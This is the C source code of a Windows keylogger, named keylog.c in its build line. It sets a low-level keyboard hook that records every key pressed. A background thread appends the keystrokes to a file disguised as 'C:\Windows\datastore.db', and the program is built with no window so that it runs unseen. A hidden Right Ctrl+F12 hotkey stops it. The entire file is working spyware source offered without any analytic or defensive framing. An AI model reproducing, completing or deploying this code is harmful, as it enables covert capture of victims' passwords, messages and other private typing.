//MSVC=keylog.c tinyc/CRT0TWIN.cpp tinyc/argcargv.cpp tinyc/initterm.cpp user32.lib /I./tinyc /Ox /link /out:../../Desktop/kle.exe /nodefaultlib:libc.lib /nodefaultlib:libcmt.lib /subsystem:windows

//#define _WIN32_WINNT 0x0500
#define WIN32_LEAN_AND_MEAN
#define NOGDICAPMASKS
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOMENUS
#define NOICONS
#define NOKEYSTATES
#define NOSYSCOMMANDS
#define NORASTEROPS
#define OEMRESOURCE
#define NOATOM
#define NOCLIPBOARD
#define NOCOLOR
#define NOCTLMGR
#define NODRAWTEXT
#define NOGDI
#define NONLS
#define NOMB
#define NOMEMMGR
#define NOMETAFILE
#define NOMINMAX
#define NOSCROLL
#define NOSERVICE
#define NOSOUND
#define NOTEXTMETRIC
#define NOWINOFFSETS
#define NOCOMM
#define NOKANJI
#define NOHELP
#define NOPROFILER
#define NODEFERWINDOWPOS
#define NOMCX
#include <windows.h>

// char *VK_KEYS[] = { "VK_LBUTTON", "VK_RBUTTON", "VK_CANCEL", "VK_MBUTTON", "VK_XBUTTON1", "VK_XBUTTON2", "[R]", "VK_BACK", "VK_TAB", "[R]", "[R]", "VK_CLEAR", "VK_RETURN", "[R]", "[R]", "VK_SHIFT", "VK_CONTROL", "VK_MENU", "VK_PAUSE", "VK_CAPITAL", "VK_KANA", "VK_HANGEUL", "VK_HANGUL", "[R]", "VK_JUNJA", "VK_FINAL", "VK_HANJA", "VK_KANJI", "[R]", "VK_ESCAPE", "VK_CONVERT", "VK_NONCONVERT", "VK_ACCEPT", "VK_MODECHANGE", "VK_SPACE", "VK_PRIOR", "VK_NEXT", "VK_END", "VK_HOME", "VK_LEFT", "VK_UP", "VK_RIGHT", "VK_DOWN", "VK_SELECT", "VK_PRINT", "VK_EXECUTE", "VK_SNAPSHOT", "VK_INSERT", "VK_DELETE", "VK_HELP", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "VK_LWIN", "VK_RWIN", "VK_APPS", "[R]", "VK_SLEEP", "VK_NUMPAD0", "VK_NUMPAD1", "VK_NUMPAD2", "VK_NUMPAD3", "VK_NUMPAD4", "VK_NUMPAD5", "VK_NUMPAD6", "VK_NUMPAD7", "VK_NUMPAD8", "VK_NUMPAD9", "VK_MULTIPLY", "VK_ADD", "VK_SEPARATOR", "VK_SUBTRACT", "VK_DECIMAL", "VK_DIVIDE", "VK_F1", "VK_F2", "VK_F3", "VK_F4", "VK_F5", "VK_F6", "VK_F7", "VK_F8", "VK_F9", "VK_F10", "VK_F11", "VK_F12", "VK_F13", "VK_F14", "VK_F15", "VK_F16", "VK_F17", "VK_F18", "VK_F19", "VK_F20", "VK_F21", "VK_F22", "VK_F23", "VK_F24", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "VK_NUMLOCK", "VK_SCROLL", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "VK_LSHIFT", "VK_RSHIFT", "VK_LCONTROL", "VK_RCONTROL", "VK_LMENU", "VK_RMENU", "VK_BROWSER_BACK", "VK_BROWSER_FORWARD", "VK_BROWSER_REFRESH", "VK_BROWSER_STOP", "VK_BROWSER_SEARCH", "VK_BROWSER_FAVORITES", "VK_BROWSER_HOME", "VK_VOLUME_MUTE", "VK_VOLUME_DOWN", "VK_VOLUME_UP", "VK_MEDIA_NEXT_TRACK", "VK_MEDIA_PREV_TRACK", "VK_MEDIA_STOP", "VK_MEDIA_PLAY_PAUSE", "VK_LAUNCH_MAIL", "VK_LAUNCH_MEDIA_SELECT", "VK_LAUNCH_APP1", "VK_LAUNCH_APP2", "[R]", "[R]", "VK_OEM_1", "VK_OEM_PLUS", "VK_OEM_COMMA", "VK_OEM_MINUS", "VK_OEM_PERIOD", "VK_OEM_2", "VK_OEM_3", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "VK_OEM_4", "VK_OEM_5", "VK_OEM_6", "VK_OEM_7", "VK_OEM_8", "[R]", "[R]", "VK_OEM_102", "[R]", "[R]", "VK_PROCESSKEY", "[R]", "VK_PACKET", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "[R]", "VK_ATTN", "VK_CRSEL", "VK_EXSEL", "VK_EREOF", "VK_PLAY", "VK_ZOOM", "VK_NONAME", "VK_PA1", "VK_OEM_CLEAR" };

HANDLE hf;
HANDLE c;
unsigned char *a;
unsigned long length;
unsigned long llength;

#define MAXSIZE 2097152
#define LENGTH (length > MAXSIZE ? (length = 0) : length)
#define LLENGTH (llength > MAXSIZE ? (llength = 0) : llength)
#define print(MSG) WriteFile(c, MSG, strlen(MSG), NULL, NULL);FlushFileBuffers(c)

void ifExit(void){
	int i = 1;
	char data[1];
	print("Exiting");
	while(i) {
		if(LENGTH == LLENGTH)  {
			i = 0;
		}
		data[0] = a[LLENGTH];
		WriteFile(hf, data, 1, NULL, NULL);
		llength++;
	}
	FlushFileBuffers(hf);
	CloseHandle(hf);
}

BOOL WINAPI exitHandler(DWORD unused) {
	ifExit();
	return TRUE;
}

DWORD WINAPI winqThread(void *n) {
	char data[1];
	while(1) {
		print("Start Write");
		while(LENGTH == LLENGTH) Sleep(1);
		print("Allocating");
		data[0] = a[LLENGTH];
		print("Writing");
		WriteFile(hf, data, 1, NULL, NULL);
		print("Increasing LLENGTH");
		//FlushFileBuffers(hf);
		llength++;
		print("End Write");
	}
	print("Exit Queue Thread");
	return 0;
}

DWORD WINAPI wincheckThread(void *n) {
	while(1) {
		if ((GetAsyncKeyState(VK_RCONTROL) && GetAsyncKeyState(VK_F12))) ExitProcess(0);
		Sleep(10);
	}
	return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) 
		a[length++] = (unsigned char)((PKBDLLHOOKSTRUCT) (lParam))->vkCode;
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow )  {
	MSG msg;
	SetConsoleCtrlHandler(exitHandler, TRUE);
	length = 1;
	llength = 1;
	a = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXSIZE+1);
	atexit(ifExit);
	hf = CreateFile("C:\\Windows\\datastore.db", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	c = CreateFile("C:\\kle.log", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	// Set windows hook
	SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
	CreateThread(NULL, 0, winqThread, NULL, 0, NULL);
	CreateThread(NULL, 0, wincheckThread, NULL, 0, NULL);
    while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
    }
	CloseHandle(hf);
	return 0;
}

